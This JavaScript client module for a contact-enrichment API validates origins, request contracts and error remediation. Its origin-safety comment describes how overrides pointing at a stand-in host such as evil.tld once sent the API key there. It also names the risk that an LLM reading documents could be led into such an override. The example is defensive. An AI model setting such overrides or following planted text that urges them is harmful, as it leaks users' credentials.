// _lib/client.mjs — the RichAPI HTTP client.
//
// The API is POST-only and sync-only. Auth is `x-api-key`. There are no batch or
// async variants for the email path (the old MCP had them; REST does not), so the
// executor loops single calls with Retry-After discipline.
//
// This module owns ONE job the spec cannot do for us: request validation.
// Ten endpoints declare no required request fields, and `email_finder` and
// `phone_finder` both set `requestBody: required: false` — an empty POST is
// spec-valid on the 25-credit call. A generated client would validate nothing.
// So REQUEST_CONTRACTS below is hand-written from the spec's declared properties
// and enforced before a single credit is spent.

import { HttpError } from './journal.mjs';
import { NULL_ENUM } from './dual-contract.mjs';

export const DEFAULT_BASE_URL = 'https://api.richapi.ai/api/v1';
export const DEFAULT_ORIGIN = 'https://api.richapi.ai';
export const DEFAULT_HOST = 'api.richapi.ai';

/** The env var that overrides the origin, and the one that must opt in to it. */
export const ORIGIN_ENV = 'richapi_API_ORIGIN';
export const ORIGIN_OPT_IN_ENV = 'richapi_ALLOW_CUSTOM_ORIGIN';

export class MissingApiKey extends Error {
  constructor (msg = 'richapi_API_KEY is not set') { super(msg); this.name = 'MissingApiKey'; }
}

/**
 * Thrown when an origin override would put `richapi_API_KEY` somewhere it must not go.
 * It is a THROW, never a fallback: silently reverting to the default would leave the
 * user believing their override was in force while the key went to api.richapi.ai.
 */
export class UnsafeOrigin extends Error {
  constructor (msg) { super(msg); this.name = 'UnsafeOrigin'; }
}

// ---------------------------------------------------------------------------
// Origin safety
// ---------------------------------------------------------------------------
//
// `post()` puts the live API key in an `x-api-key` REQUEST HEADER on every call.
// The origin that header is sent to used to come from `richapi_API_ORIGIN` with no
// allowlist, no scheme check and no warning, so `richapi_API_ORIGIN=http://evil.tld`
// exfiltrated the key in plaintext on the next call, and
// `richapi-capture-fixtures --run --yes --base-url https://evil.tld` posted it once
// per endpoint in the spec.
//
// That is worse here than in an ordinary CLI: the operating model is an LLM composing
// invocations from documents it just read, so a silent origin override is one token
// away from key exfiltration.
//
// THE RULE
//   1. The default origin (https://api.richapi.ai) is always allowed.
//   2. A loopback host is always allowed, http: included — 127.0.0.0/8, ::1 and
//      `localhost` never leave the machine, and every local mock server and the
//      setup sweep's own tests depend on this. Same carve-out browsers make for
//      secure contexts, and for the same reason.
//   3. Any other origin MUST be https:. http: to a remote host is refused outright;
//      there is no flag for it, because there is no safe version of it.
//   4. Any other https: origin needs an explicit opt-in:
//        richapi_ALLOW_CUSTOM_ORIGIN=<hostname>   (pinned — preferred)
//        richapi_ALLOW_CUSTOM_ORIGIN=1|true|yes   (any https origin)
//   5. Credentials embedded in the origin (https://user:pass@host) are refused;
//      they would go on the wire and are never a legitimate way to reach this API.
//
// A refusal names the origin and says outright that nothing was sent and nothing
// fell back.

/** Loopback hosts: the key cannot leave the machine, so http: is fine here. */
function isLoopbackHost (hostname) {
  const h = String(hostname ?? '').replace(/^\[/, '').replace(/\]$/, '').toLowerCase();
  if (h === 'localhost' || h.endsWith('.localhost')) return true;
  if (h === '::1' || h === '0:0:0:0:0:0:0:1') return true;
  return /^127\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.test(h);
}

/** Never echo userinfo back at the user, and never echo an unbounded string. */
function displayOrigin (raw) {
  const s = String(raw ?? '').replace(/\/\/[^/@\s]*@/, '//***@');
  return s.length > 200 ? `${s.slice(0, 200)}...` : s;
}

function optedIn (env, hostname) {
  const raw = String(env?.[ORIGIN_OPT_IN_ENV] ?? '').trim().toLowerCase();
  if (raw === '') return false;
  if (raw === '1' || raw === 'true' || raw === 'yes') return true;
  return raw === String(hostname).toLowerCase();
}

/**
 * Validate one origin (or full base URL) before the API key is ever sent to it.
 * Returns the parsed URL on success; throws {@link UnsafeOrigin} otherwise.
 *
 * @param {string} value      the origin or base URL to check
 * @param {{env?: object, source?: string}} [opts]  `source` names what set it, so the
 *        refusal tells the user which knob to turn (`richapi_API_ORIGIN`, `--base-url`).
 */
export function assertSafeOrigin (value, { env = process.env, source = ORIGIN_ENV } = {}) {
  const shown = displayOrigin(value);
  let url;
  try {
    url = new URL(String(value));
  } catch {
    throw new UnsafeOrigin(
      `REFUSED: ${source}=${shown} is not an absolute URL, so it cannot be checked before `
      + 'your richapi_API_KEY is sent to it.\n'
      + `Nothing was sent. There is NO fallback to ${DEFAULT_ORIGIN} — unset ${source} if that is what you meant.`,
    );
  }

  if (url.protocol !== 'https:' && url.protocol !== 'http:') {
    throw new UnsafeOrigin(
      `REFUSED: ${source}=${shown} uses the "${url.protocol}" scheme. The API origin must be https:.\n`
      + `Nothing was sent. There is NO fallback to ${DEFAULT_ORIGIN} — unset ${source} if that is what you meant.`,
    );
  }

  if (url.username || url.password) {
    throw new UnsafeOrigin(
      `REFUSED: ${source}=${displayOrigin(`${url.protocol}//***@${url.host}`)} embeds credentials in the origin. `
      + 'They would go on the wire alongside your richapi_API_KEY.\n'
      + `Nothing was sent. There is NO fallback to ${DEFAULT_ORIGIN} — remove the credentials or unset ${source}.`,
    );
  }

  // 1. The default. Always fine.
  if (url.protocol === 'https:' && url.host === DEFAULT_HOST) return url;

  // 2. Loopback. The key never leaves the machine, so http: is allowed and no opt-in
  //    is required — this is what every local mock server in the suite relies on.
  if (isLoopbackHost(url.hostname)) return url;

  // 3. Remote plaintext. No flag unlocks this.
  if (url.protocol !== 'https:') {
    throw new UnsafeOrigin(
      `REFUSED: ${source}=${shown} is http:, which would put your richapi_API_KEY in a plaintext `
      + 'request header on the wire.\n'
      + 'The API origin must be https:. http: is accepted only for loopback hosts '
      + '(localhost, 127.0.0.0/8, ::1).\n'
      + `Nothing was sent. There is NO fallback to ${DEFAULT_ORIGIN} — unset ${source} if that is what you meant.`,
    );
  }

  // 4. A remote https host that is not the default. Needs a deliberate opt-in.
  if (!optedIn(env, url.hostname)) {
    throw new UnsafeOrigin(
      `REFUSED: ${source}=${shown} is not the default API origin (${DEFAULT_ORIGIN}), and sending your `
      + 'richapi_API_KEY to another host requires an explicit opt-in.\n'
      + `Nothing was sent. There is NO fallback to ${DEFAULT_ORIGIN} — the override was refused, not ignored.\n`
      + 'If this origin is yours (self-hosted or a proxy you control), opt in with:\n'
      + `    export ${ORIGIN_OPT_IN_ENV}=${url.hostname}\n`
      + `  or ${ORIGIN_OPT_IN_ENV}=1 to allow any https origin.`,
    );
  }

  return url;
}

/**
 * Resolve the base URL a client should use, checking it first.
 *
 * Precedence is unchanged from before the fix — explicit option, then
 * `richapi_API_ORIGIN`, then the default — only now nothing reaches the wire
 * without passing {@link assertSafeOrigin}.
 */
export function resolveBaseUrl ({ baseUrl, env = process.env } = {}) {
  if (baseUrl !== undefined && baseUrl !== null && String(baseUrl).trim() !== '') {
    assertSafeOrigin(baseUrl, { env, source: 'baseUrl' });
    return { baseUrl: String(baseUrl).replace(/\/+$/, ''), source: 'baseUrl' };
  }
  const raw = env?.[ORIGIN_ENV];
  if (raw !== undefined && raw !== null && String(raw).trim() !== '') {
    assertSafeOrigin(raw, { env, source: ORIGIN_ENV });
    return { baseUrl: `${String(raw).replace(/\/+$/, '')}/api/v1`, source: ORIGIN_ENV };
  }
  return { baseUrl: DEFAULT_BASE_URL, source: 'default' };
}

/**
 * Own-property lookup. A bare `obj[key]` on an object literal answers truthily
 * for `__proto__`, `constructor`, `valueOf` and every other `Object.prototype` member,
 * so a membership guard written that way lets those names through the one check whose
 * whole job is refusing to guess. `_lib/gates.mjs` already does this correctly
 * everywhere; these tables now do too.
 */
function own (obj, key) {
  return obj != null && (typeof key === 'string' || typeof key === 'number')
    && Object.prototype.hasOwnProperty.call(obj, key);
}

export class RequestContractError extends Error {
  constructor (msg) { super(msg); this.name = 'RequestContractError'; }
}

/**
 * Per-endpoint request contracts.
 *
 * `requires` is OUR floor, not the spec's — the spec's floor is empty on the two
 * most expensive calls in the waterfall. Each entry is a list of alternative
 * satisfying key-sets: at least one set must be fully present.
 *
 * Note the field-name inconsistency: `email_finder` takes `company_domain` and
 * `phone_finder` takes `domain` for the same concept, the company's domain. Each
 * endpoint therefore states its own keys here, and RECORD_MAPPINGS below fills one
 * from the other. That is a rename, not a semantic guess — refusing it would make
 * any list whose column is called `domain` unusable with email_finder. What is NOT
 * inferred is a value that is absent: an empty POST is never sent.
 */
export const REQUEST_CONTRACTS = Object.freeze({
  enrich_profile: {
    properties: ['url'],
    requires: [['url']],
  },
  enrich_company: {
    properties: ['url'],
    requires: [['url']],
    hint: 'a LinkedIn company URL or its universalName slug. A website or a bare domain '
      + 'is not one: resolve it first (find_website_by_company_name, then '
      + 'linkedin_company_search), which is Pass 0 in the account-research skill.',
  },
  email_finder: {
    properties: ['first_name', 'last_name', 'company_domain', 'linkedin_url', 'company_name'],
    // Spec says nothing is required. A name with no company is unanswerable, and
    // an empty POST is 5 credits for nothing.
    //
    // A company NAME is not enough: live on 2026-09-17, first + last + company_name
    // with no domain answered http_400. The name still rides along when a domain or
    // a profile URL is present, because the endpoint accepts it as a hint.
    requires: [['linkedin_url'], ['first_name', 'last_name', 'company_domain']],
  },
  phone_finder: {
    properties: ['linkedin_url', 'first_name', 'last_name', 'domain'],
    // 25 credits/call, the most expensive in the API. The floor is strictest here.
    requires: [['linkedin_url'], ['first_name', 'last_name', 'domain']],
  },
  email_verifier: {
    properties: ['email'],
    requires: [['email']],
  },
  // --- bulk forms ---
  //
  // These do NOT take the same input as their single counterparts, which is the fact
  // that decides whether auto-batching can ever fire:
  //   enrich_profile        takes `url`   (a LinkedIn profile URL)
  //   enrich_profiles_bulk  takes `urns`  ("List of LinkedIn entity URNs", max 50)
  //   enrich_company        takes `url`
  //   enrich_companies_bulk takes `urns`  ("numeric LinkedIn company IDs", max 50)
  //
  // A profile URL is not a URN, and no endpoint in this API converts one to the other.
  // Company URNs DO appear in linkedin_company_search results (`urn: "76136784"`), so
  // the company path is reachable; the person path is not, from a list of profile URLs.
  // The executor therefore batches only when the rows already carry `urn`, and says so
  // when they do not, rather than silently issuing 500 single calls with no explanation.
  enrich_profiles_bulk: {
    properties: ['urns'],
    requires: [['urns']],
  },
  enrich_companies_bulk: {
    properties: ['urns'],
    requires: [['urns']],
  },
  identify_email_type: {
    properties: ['email'],
    requires: [['email']],
  },
});

/**
 * Non-empty scalar. Empty string, whitespace, null and the pack's explicit empty
 * markers never satisfy a contract.
 *
 * THE MARKERS BELONG HERE, not only at the callers. `buildRequestFor` (_lib/run.mjs)
 * strips them before it builds, but it is not the only caller: `_lib/enrich.mjs:516`
 * hands the executor's merged record straight to `buildRequest`, and `_lib/cache.mjs`
 * derives its key the same way. Measured on the 2026-09-17 runs: a row whose `email`
 * column read `not_found` satisfied `email_verifier`'s contract and was BILLED for a
 * verification of the literal string. An empty value must be refused exactly as a
 * missing one is — for free, before the wire, with the same reason text.
 */
function present (v) {
  if (v === undefined || v === null) return false;
  const s = String(v).trim();
  return s !== '' && !NULL_ENUM.includes(s.toLowerCase());
}

/**
 * Input-column -> request-parameter mapping.
 *
 * The API names the same thing differently across endpoints, and a list CSV names it
 * differently again. `enrich_profile` takes `url`, meaning a LinkedIn profile URL,
 * while every prospect list in existence calls that column `linkedin_url`. This is
 * the ONE place that mapping is written down: the planner and the executor both go
 * through `buildRequest`, so they cannot disagree about whether a row is enrichable.
 * An earlier version mapped it in the planner only, and every enrich_profile hop
 * failed at execution having been planned as runnable.
 */
export const RECORD_MAPPINGS = Object.freeze({
  enrich_profile: (r) => ({ url: r.url ?? r.linkedin_url ?? r.profile_url }),
  // enrich_company takes a LinkedIn company IDENTITY, never a website. Measured
  // against the live API on 2026-09-18:
  //     url=https://www.linkedin.com/company/stripe  -> 200, the company
  //     url=stripe                (the universalName) -> 200, the same company
  //     url=stripe.com                                -> 404
  //     url=https://stripe.com                        -> 503, "upstream unavailable"
  // The old chain read `company_website ?? website ?? company_domain ?? domain`, so
  // four of its five branches fed the endpoint the one kind of value it cannot answer.
  // Every row of a domain-keyed list planned as runnable and then missed — free, since
  // a non-2xx is unbilled, but a whole run that could only ever return nothing. A
  // domain is resolved to a LinkedIn company first; that is Pass 0 in account-research.
  enrich_company: (r) => ({
    url: [r.company_linkedin_url, r.linkedin_company_url, r.url, r.linkedin_url]
      .find((v) => linkedinCompanyRef(v)),
  }),
  // phone_finder takes `domain`; email_finder takes `company_domain`. Same concept,
  // different names, so each is filled from the other only when its own is absent.
  phone_finder: (r) => ({ domain: r.domain ?? r.company_domain }),
  email_finder: (r) => ({ company_domain: r.company_domain ?? r.domain }),
});

/**
 * Is this a LinkedIn company the enrichment endpoint can answer?
 *
 * Two forms work, and nothing else does: the company URL, and the bare `universalName`
 * slug it ends in. A website URL or a bare domain is NOT one — see RECORD_MAPPINGS.
 */
export function linkedinCompanyRef (value) {
  const v = String(value ?? '').trim();
  if (v === '') return null;
  const m = v.match(/linkedin\.com\/company\/([^/?#]+)/i);
  if (m) return v;
  // A bare slug: no scheme, no path, and no dot — a dot makes it a domain.
  if (/^[a-z0-9][a-z0-9-]*$/i.test(v)) return v;
  return null;
}

/**
 * The LinkedIn entity URN a row may already carry. Returns null when absent — this is
 * the predicate that decides whether a hop can be batched, so it never guesses.
 */
export function urnOf (record) {
  const v = record?.urn ?? record?.linkedin_urn ?? record?.entity_urn ?? record?.company_urn;
  return present(v) ? String(v).trim() : null;
}

/** Apply the mapping for one endpoint, leaving the record itself untouched. */
export function mapRecord (endpoint, record) {
  // own(): `RECORD_MAPPINGS['constructor']` is the `Object` function, and calling it
  // would silently "map" the record.
  const fn = own(RECORD_MAPPINGS, endpoint) ? RECORD_MAPPINGS[endpoint] : null;
  return fn ? { ...record, ...fn(record ?? {}) } : record;
}

/**
 * Build and validate the request body for one endpoint from a contact record.
 * Returns { ok: true, payload } or { ok: false, reason } — the caller journals a
 * `skipped` unit rather than paying for a call that cannot succeed.
 */
export function buildRequest (endpoint, record) {
  // own(): `REQUEST_CONTRACTS['__proto__']` is Object.prototype — truthy — so the
  // refusal below never fired and the loop over `contract.properties` threw a
  // TypeError instead of saying what was wrong.
  const contract = own(REQUEST_CONTRACTS, endpoint) ? REQUEST_CONTRACTS[endpoint] : null;
  if (!contract) {
    return { ok: false, reason: `no request contract for "${endpoint}" — refusing to guess a payload` };
  }
  const mapped = mapRecord(endpoint, record ?? {});
  const payload = {};
  for (const key of contract.properties) {
    const v = mapped?.[key];
    // urns[]: an EMPTY element is not an identifier. A `urns: ['']` array passed the
    // length test and bought a bulk call on nothing.
    if (Array.isArray(v)) { const kept = v.filter(present); if (kept.length) payload[key] = kept; continue; }
    if (present(v)) payload[key] = String(v).trim();
  }
  const satisfied = contract.requires.some(set => set.every(k => present(payload[k])));
  if (!satisfied) {
    const options = contract.requires.map(s => s.join('+')).join('  OR  ');
    const hint = contract.hint ? ` — ${contract.hint}` : '';
    return { ok: false, reason: `insufficient input for ${endpoint}; need one of: ${options}${hint}` };
  }
  return { ok: true, payload };
}

// ---------------------------------------------------------------------------
// The fix the server already sends with a 400, which this client used to discard
// ---------------------------------------------------------------------------
//
// Before a waterfall spends anything, the handler pre-validates the input shape and,
// on failure, answers with a `claude_friendly_error` body — unconditionally, for every
// caller, no header required:
//
//   backend/app/proxy/handler.py:2729-2758
//     accepted_shapes = _waterfall_acceptable_input_shapes(wf_config, params)
//     if not accepted_shapes:
//         err_body = {"error": "Missing required input...",
//                     "accepted_input_shapes": required_summary}
//         err_body = claude_friendly_error(400, err_body,
//                       how_to_fix=how_to_fix_missing_inputs(api_name, required_summary),
//                       example_request=_WATERFALL_EXAMPLES.get(...))
//         return _response(400, err_body)
//
//   backend/app/proxy/mcp_integration.py:2055-2098
//     claude_friendly_error -> {..., "status", "how_to_fix", "example_request"}
//     how_to_fix_missing_inputs -> "Send one of: first_name+last_name+domain, ..."
//
// `post()` turned all of that into `HttpError(400)` and dropped the body on the floor.
// This pack has already paid for exactly that: the `linkedin_url` -> `url` mapping
// divergence cost a full 500-row run, and this is the server telling us, per call,
// which field name it actually wants.
//
// LAW 7 — WHERE THE LINE IS.
//
//   The PERSISTED record does not change at all. `journal.errorCode` keys off
//   `err instanceof HttpError` and `err.status` (_lib/journal.mjs:608-611), and
//   `_lib/batch.mjs:178` does the same, so the journal still writes the SAFE_TOKEN
//   `http_400` and nothing else. `_lib/ledger.mjs` records status and credits, never
//   a body. Nothing below is written to a journal, a ledger, a receipt or a share.
//
//   The HUMAN-FACING message may be rich, and it is: it goes on `err.message` and
//   `err.hint`, which are read by a person at a terminal.
//
//   An error body MAY echo the request, and the request carries contacts. So the
//   extraction is a tight allowlist of four server-authored keys, and every string
//   that survives it is checked against the payload we just sent: anything echoing a
//   value we supplied is replaced with a marker instead of being repeated back. That
//   is the precise threat — the echo — and it is closed at the only place that knows
//   both halves, the call site that has the payload in hand.

/** The only keys lifted out of an error body. Everything else is dropped unread. */
export const REMEDIATION_KEYS = Object.freeze([
  'error',                   // "Missing required input. Provide one of ..."
  'how_to_fix',              // "Send one of: first_name+last_name+domain, linkedin_url"
  'accepted_input_shapes',   // [{provider, required_fields: [...]}, ...]
  'example_request',         // {"linkedin_url": "https://www.linkedin.com/in/satyanadella/"}
  // The scrapers and the search endpoints answer a different shape from the waterfall
  // handler's. RECORDED, not guessed — tests/fixtures/live/google_ad_transparency_scraper_sync.json
  // and linkedin_ad_search.json both carry it verbatim:
  //   {"error": "...", "supported_fields": {"accepted": [...], "required": [...]}}
  // Without it a live 422 from web_emails and a 400 from lead_search reached the
  // terminal as the bare token `http_422` / `http_400`, and which field the server
  // actually wanted was a guess. FIELD NAMES ONLY; values never leave this function.
  'supported_fields',
]);

export const ECHO_REDACTED = '[redacted: echoes a value from your request]';

/** Caps, so a hostile or verbose body cannot become an unbounded terminal dump. */
const MAX_SENTENCE = 400;
const MAX_SHAPES = 8;
const MAX_EXAMPLE_KEYS = 12;
const MIN_ECHO_LEN = 4;   // shorter than this and "echo" is coincidence, not a leak

/** Every scalar the caller sent, as lowercased strings. The echo denylist. */
function sentValues (payload, acc = new Set(), depth = 0) {
  if (depth > 4 || payload === null || payload === undefined) return acc;
  if (Array.isArray(payload)) {
    for (const v of payload) sentValues(v, acc, depth + 1);
    return acc;
  }
  if (typeof payload === 'object') {
    for (const v of Object.values(payload)) sentValues(v, acc, depth + 1);
    return acc;
  }
  const s = String(payload).trim().toLowerCase();
  if (s.length >= MIN_ECHO_LEN) acc.add(s);
  return acc;
}

/** A server string, unless it repeats something we sent — then a marker instead. */
function withoutEcho (value, sent) {
  if (typeof value !== 'string') return null;
  const s = value.trim();
  if (s === '') return null;
  const hay = s.toLowerCase();
  for (const needle of sent) {
    if (hay.includes(needle)) return ECHO_REDACTED;
  }
  return s.length > MAX_SENTENCE ? `${s.slice(0, MAX_SENTENCE)}...` : s;
}

/**
 * Lift the server's self-remediation out of an error body, echo-scrubbed.
 *
 * Returns null when the body carries none of it, so a plain `{"error": "Invalid JSON"}`
 * reads exactly as it did before.
 *
 * @param {unknown} body     the parsed error body
 * @param {unknown} payload  the request we sent, so an echo of it can be caught
 */
export function extractRemediation (body, payload = null) {
  if (!body || typeof body !== 'object' || Array.isArray(body)) return null;
  const sent = sentValues(payload);
  const out = {};

  if (own(body, 'error')) {
    const e = withoutEcho(body.error, sent);
    if (e) out.error = e;
  }
  if (own(body, 'how_to_fix')) {
    const h = withoutEcho(body.how_to_fix, sent);
    if (h) out.how_to_fix = h;
  }
  if (own(body, 'accepted_input_shapes') && Array.isArray(body.accepted_input_shapes)) {
    // FIELD NAMES ONLY — the same discipline `inspectResponse` applies to `raw_keys`.
    // A required-field list is what the next caller needs; a value is a contact.
    const shapes = [];
    for (const shape of body.accepted_input_shapes.slice(0, MAX_SHAPES)) {
      const fields = Array.isArray(shape?.required_fields) ? shape.required_fields
        : Array.isArray(shape) ? shape
        : null;
      if (!fields) continue;
      const names = fields.filter(f => typeof f === 'string' && f.trim() !== '')
        .map(f => withoutEcho(f, sent))
        .filter(Boolean);
      if (names.length) shapes.push(names);
    }
    if (shapes.length) out.accepted_input_shapes = shapes;
  }
  if (own(body, 'supported_fields') && body.supported_fields
      && typeof body.supported_fields === 'object' && !Array.isArray(body.supported_fields)) {
    const sf = {};
    for (const half of ['required', 'accepted']) {
      const list = body.supported_fields[half];
      if (!Array.isArray(list)) continue;
      const names = list.slice(0, MAX_SHAPES * 4)
        .filter((f) => typeof f === 'string' && f.trim() !== '')
        .map((f) => withoutEcho(f, sent))
        .filter(Boolean);
      if (names.length) sf[half] = names;
    }
    if (Object.keys(sf).length) out.supported_fields = sf;
  }
  if (own(body, 'example_request') && body.example_request
      && typeof body.example_request === 'object' && !Array.isArray(body.example_request)) {
    // The server's OWN example payload (mcp_integration.py `_WATERFALL_EXAMPLES`), which
    // is the whole point: "this endpoint wants `url`, not `linkedin_url` — here." Its
    // values are the server's, not ours, and `withoutEcho` proves that per value rather
    // than trusting it: anything matching what we sent is a mirror, not an example.
    const example = {};
    let n = 0;
    for (const [k, v] of Object.entries(body.example_request)) {
      if (n >= MAX_EXAMPLE_KEYS) break;
      if (typeof k !== 'string' || k.trim() === '') continue;
      if (v === null || typeof v === 'object') continue;
      const scrubbed = withoutEcho(String(v), sent);
      if (!scrubbed) continue;
      example[k] = scrubbed;
      n += 1;
    }
    if (n) out.example_request = example;
  }

  return Object.keys(out).length ? out : null;
}

/**
 * Render remediation as the paragraph a person reads. Returns '' for null, so callers
 * can concatenate unconditionally.
 */
export function renderRemediation (rem, { endpoint = null, status = null } = {}) {
  if (!rem) return '';
  const L = [];
  const head = endpoint ? `${endpoint} refused this call` : 'the API refused this call';
  L.push(status ? `${head} (HTTP ${status}).` : `${head}.`);
  if (rem.error) L.push(`  ${rem.error}`);
  if (rem.how_to_fix) L.push(`  Fix: ${rem.how_to_fix}`);
  if (rem.accepted_input_shapes) {
    L.push(`  Accepted input shapes: ${rem.accepted_input_shapes.map(s => s.join('+')).join('  OR  ')}`);
  }
  if (rem.supported_fields) {
    const { required, accepted } = rem.supported_fields;
    if (required) L.push(`  The endpoint requires: ${required.join(', ')}`);
    if (accepted) L.push(`  It accepts only: ${accepted.join(', ')}`);
  }
  if (rem.example_request) {
    L.push(`  Working example: ${JSON.stringify(rem.example_request)}`);
  }
  return L.join('\n');
}

/**
 * The server's own explanation of a refusal, put where a person will see it.
 *
 * `client.httpErrorFor` already lifts an echo-scrubbed `error` / `how_to_fix` /
 * `supported_fields` / `example_request` out of the body onto `err.hint`. Nothing read
 * it back: the exception travelled up to `runHopMajor`, which journals the SAFE_TOKEN
 * `http_<status>` (the journal-line contract pins `error` to a short code, and it stays
 * that way — a free-text error is the easiest PII leak into a journal). So a live 422
 * from `web_emails` whose body named the accepted fields reached the terminal as the
 * five characters `http_422`, and an `http_400` from `lead_search` left which filter was
 * rejected as a guess.
 *
 * The note channel is the human-facing half, and it is already rendered (`! <note>`)
 * and carried in `--json`. Deduplicated, because a 500-row list fails 500 times with
 * the same sentence.
 */
export function noteRemediation (notes, err) {
  const hint = err?.hint;
  if (!Array.isArray(notes) || typeof hint !== 'string' || hint.trim() === '') return;
  if (!notes.includes(hint)) notes.push(hint);
}

/**
 * How much bigger than the planned page the API may answer before the walk stops.
 *
 * FAIL CLOSED (law 5): a missing key is not "no gate", it is zero tolerance.
 */
export function overdeliveryTolerance (gates) {
  try {
    const pct = Number(gateValue(gates, 'unbounded_endpoints.page_size_overdelivery_tolerance_pct'));
    return Number.isFinite(pct) && pct >= 0 ? pct / 100 : 0;
  } catch { return 0; }
}

/** A page delivered materially more than the plan priced. */
export function overdelivered (planned, delivered, tolerance) {
  if (!Number.isFinite(planned) || planned <= 0) return false;
  if (!Number.isFinite(delivered) || delivered <= 0) return false;
  return delivered > planned * (1 + tolerance);
}

/**
 * Build the `HttpError` a non-2xx becomes.
 *
 * STILL an `HttpError`, with `status`, `body` and `retryAfter` exactly as before — the
 * 402/429 handling in `_lib/journal.mjs`, `_lib/batch.mjs`, `_lib/run.mjs` and
 * `_lib/enrich.mjs` all `instanceof`-check this type and read those three fields, and
 * none of them may see a new shape. Everything added here is additive:
 *
 *   err.remediation  the structured, echo-scrubbed extraction (or null)
 *   err.hint         the rendered paragraph (or null)
 *   err.message      `http_<status>` as before when there is nothing to say, and
 *                    `http_<status>: <hint>` when there is. `errorCode()` never reads
 *                    the message — it reads `err.status` — so the journal token is
 *                    unaffected either way.
 */
export function httpErrorFor (status, { body = null, retryAfter = null, endpoint = null, payload = null } = {}) {
  const err = new HttpError(status, { body, retryAfter });
  const rem = extractRemediation(body, payload);
  err.remediation = rem;
  err.hint = rem ? renderRemediation(rem, { endpoint, status }) : null;
  if (err.hint) err.message = `http_${status}: ${err.hint}`;
  return err;
}

// ---------------------------------------------------------------------------
// `X-MCP-Compact: 1`, the ~75% token discount the server already offers
// ---------------------------------------------------------------------------
//
// The waterfall handler reads this header from ANY caller, not just the MCP server:
//
//   backend/app/proxy/handler.py:2842-2853
//     _headers = req.headers
//     for _k, _v in _headers.items():
//         if isinstance(_k, str) and _k.lower() == "x-mcp-compact":   # case-INSENSITIVE
//             _compact_flag = str(_v or "")
//     if _compact_flag.strip().lower() in ("1", "true", "yes"):
//         response_body = compact_waterfall_response(response_body)
//
// There is no API-key check, no MCP check and no allowlist around it. It is a plain
// per-request opt-in, so this client can take it.
//
// WHAT IT COSTS. `compact_waterfall_response`
// (backend/app/proxy/mcp_integration.py:1981-2023) rewrites
//
//   {success, result, provider, providers_tried, execution_log, billed?, error?}
// into
//   {ok, result, provider?, billed?, why?}
//
// so four things change: `execution_log` and `providers_tried` are dropped, `success`
// is renamed `ok`, the hard-fail `error` sentence is replaced by a one-line `why`
// summarised FROM the execution_log, and `result` — the only part that carries data —
// is untouched.
//
// WHAT READS ANY OF THAT IN THIS PACK. Nothing reads `execution_log`; nothing reads
// `providers_tried`; nothing reads `success`. Checked against every consumer of a
// response body in the pack:
//
//   readAttribution (below)          reads TOP-LEVEL `provider`/`confidence` — compact
//                                    keeps `provider`, and `confidence` has always
//                                    lived under `result`, so this is unchanged.
//   journal provider attribution     is fed from readAttribution; unchanged, so
//   (_lib/journal.mjs appendResult)  /learn's per-provider hit rates are unchanged.
//   ledger resolveActual             reads `credits_charged` — a key the waterfall
//   (_lib/ledger.mjs:95)             envelope has never carried, in either mode.
//   inspectResponse (empty-column)   reads KEY NAMES for evidence. Compact removes two
//                                    keys that were only ever noise in
//                                    `unrecognised_keys`; the verdict is identical
//                                    (see the `why` note in ENVELOPE_META_KEYS).
//   run.mjs readResultRows / cache   read `result`/`data`/`results` — untouched.
//
// The one live cost is diagnostic: a failed waterfall's per-provider trail is no
// longer in the body, so `raw_keys` on a mapping failure no longer names it. That
// trail is not recorded anywhere today, so nothing regresses — but it is also the
// reason this is a switch and not a hard-coded header. Turn it off with
// `richapi_COMPACT_RESPONSES=0` (or `new RichApiClient({ compact: false })`) for one
// run when you need the full trail, and note the standing risk: if the API ever
// starts putting `credits_charged` on the waterfall envelope, compact would strip it
// and the ledger would quietly fall back from `actual` to `estimated_unverifiable`.
export const COMPACT_HEADER = 'x-mcp-compact';
export const COMPACT_HEADER_VALUE = '1';
export const COMPACT_ENV = 'richapi_COMPACT_RESPONSES';

/**
 * The endpoints in THIS pack's surface that the server routes through the waterfall
 * handler — the only handler that reads the header. Every other endpoint returns the
 * same bytes with or without it, so sending it there would be noise on the wire and a
 * false claim in the code about what the server does.
 *
 * PROVENANCE, and a name this list lost. The backend REPO knows five waterfall names:
 * `WATERFALL_CONFIGS` (backend/app/proxy/waterfall.py:301) declares four in code —
 * email_finder, phone_finder, email_verifier, person_enricher — and a fifth,
 * company_enricher, is DB-backed (backend/app/repositories/api_configs.py:78-84,
 * "DB-backed waterfall endpoints like company_enricher / email_finder") and appears in
 * the MCP metadata alongside the others (`_WATERFALL_EXAMPLES` /`_NEXT_STEPS`,
 * backend/app/proxy/mcp_integration.py:37-86).
 *
 * `company_enricher` WAS on this list and was REMOVED on 2026-08-30, because every one
 * of those artefacts — the migrations, the MCP tool registry, the Postman collection,
 * the marketing page — is a backend WORKING-COPY artefact, i.e. pre-deployment. The
 * running server does not serve it. Measured that day:
 *
 *   GET  /api/v1/catalog                 ->  {tools: [...], total: 68}, and no row is
 *                                            named "company_enricher"
 *   POST /api/v1/company_enricher        ->  404
 *   POST /api/v1/enrich_company          ->  401   (control)
 *   POST /api/v1/profile_social_metrics  ->  401   (control)
 *
 * THE METHOD, written down so this is re-checkable in one command and nobody re-adds
 * the name off the backend repo next month: the probe is an unauthenticated POST with
 * an empty body against https://api.richapi.ai. No key is sent, so nothing is billed
 * and no plan is touched — 401 and 404 are both decided before auth spends anything.
 * 401 means the route EXISTS and is behind auth; 404 means the route is not there at
 * all. That is the whole distinction, and it is the one a repo grep cannot make.
 *
 *   curl -s -o /dev/null -w '%{http_code}\n' -X POST \
 *     https://api.richapi.ai/api/v1/<endpoint> -H 'Content-Type: application/json' -d '{}'
 *
 * A header sent to a 404 is not merely wasted bytes: it is this file asserting a server
 * behaviour that has never existed, on an endpoint the pack cannot call at all.
 *
 * `person_enricher` is off the list for a plainer reason — it is in neither
 * spec/openapi.yaml nor _lib/api-catalog.json. What remains is exactly the set that is
 * in the LIVE catalog and documented multi-provider by the spec ("Tries multiple
 * providers automatically" / "via multi-provider waterfall"). Note that the pack's
 * `enrich_profile`/`enrich_company` are the LinkedIn scrapers, NOT waterfalls, and are
 * deliberately absent from this list.
 *
 * `_lib/api-catalog.json` carries NO waterfall marker of its own, so this list is checked against the catalog AND against
 * the spec's own prose by tests/response-maps, in both directions: a new documented
 * waterfall that is not listed here fails, and a name here that the catalog does not
 * have fails. The second of those two is what caught this.
 */
export const COMPACT_ENDPOINTS = Object.freeze([
  'email_finder',
  'email_verifier',
  'phone_finder',
]);

const COMPACT_ENDPOINT_SET = new Set(COMPACT_ENDPOINTS);

